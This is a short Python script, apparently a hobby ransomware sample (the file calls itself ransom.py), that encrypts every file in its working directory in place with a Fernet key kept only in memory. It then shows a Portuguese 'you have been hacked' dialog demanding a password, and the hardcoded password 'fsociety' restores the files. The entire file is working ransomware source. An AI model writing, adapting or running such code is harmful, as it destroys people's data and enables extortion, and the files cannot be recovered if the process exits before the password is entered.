import os
import tkinter as tk
from tkinter import simpledialog
from cryptography.fernet import Fernet

key = Fernet.generate_key()
f = Fernet(key)

allFiles = []

def dialogBoxInput():
  password = "fsociety"

  root = tk.Tk()
  root.withdraw()

  while True:
    usrPassword = simpledialog.askstring(
      "Input", 
      f"☠️☠️Você foi hackeado☠️☠️ \n Insira a senha para recuperar seus arquivos: "
    )

    if usrPassword == password:
      decryptFiles(selectedFiles=allFiles)
      break
    else: 
      print("incorrect password")

  root.destroy()

def encryptFiles(selectedFiles: list[str]):
  for file in selectedFiles:
    with open(file, "+rb") as readFile:
      contentFile = readFile.read()
      encryptedContentFile = f.encrypt(contentFile)
    with open(file, "+wb") as writeFile:
      writeFile.write(encryptedContentFile)
  dialogBoxInput()

def decryptFiles(selectedFiles: list[str]):
  for file in selectedFiles:
    with open(file, "rb") as readEncFile:
      contentEncFile = readEncFile.read()
    contentDecFile = f.decrypt(contentEncFile)
    with open(file, "wb") as writeEncFile:
      writeEncFile.write(contentDecFile)

for file in os.listdir():
  if os.path.isfile(file):
    if file in ["ransom.py", "decrypt.py", "requirements.txt", ".gitignore"]:
      continue
    allFiles.insert(len(allFiles), file)
encryptFiles(allFiles)